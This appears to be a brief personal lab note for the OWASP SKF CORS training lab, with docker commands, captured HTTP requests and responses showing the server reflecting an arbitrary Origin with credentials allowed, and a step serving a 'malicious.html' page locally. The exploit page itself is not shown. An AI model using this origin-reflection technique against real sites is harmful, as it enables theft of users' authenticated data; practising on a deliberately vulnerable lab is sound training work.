### cors
``` bash
# downloading lab
docker pull blabla1337/owasp-skf-lab:cors
docker run -it -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:cors

### request
GET /confidential HTTP/1.1
Host: localhost:5000
Cache-Control: max-age=0
sec-ch-ua: "Not=A?Brand";v="24", "Chromium";v="140"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:5000/
Accept-Encoding: gzip, deflate, br
Cookie: session=eyJsb2dnZWRpbiI6dHJ1ZSwidXNlcklkIjoxfQ.aQf-MA.h_qPgBOJ6kR3Bo2JQRcfu5H7RoU
Connection: keep-alive

### response
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 10293
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: *
Vary: Cookie
Server: Werkzeug/0.14.1 Python/3.6.9
Date: Mon, 03 Nov 2025 00:58:46 GMT

# Changing origin
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Origin:https://test.com
Accept: 

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 10293
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: https://test.com
Vary: Origin, Cookie
Server: Werkzeug/0.14.1 Python/3.6.9
Date: Mon, 03 Nov 2025 00:59:58 GMT

python3 -m http.server 80
http://localhost/malicious.html

```